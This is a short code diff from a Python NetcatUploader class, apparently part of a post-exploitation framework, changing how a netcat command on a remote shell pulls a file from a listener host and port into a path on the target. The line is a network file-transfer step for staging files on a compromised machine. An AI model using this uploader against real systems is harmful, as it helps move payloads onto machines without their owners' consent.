@@ -18,4 +18,4 @@ class NetcatUploader(RawUploader):
         nc = self.pty.which("nc")
         remote_file = shlex.quote(self.remote_path)
 
-        self.pty.run(f"{nc} -w 0 {lhost} {lport} > {remote_file}")
+        self.pty.run(f"{nc} {lhost} {lport} > {remote_file}", wait=False)
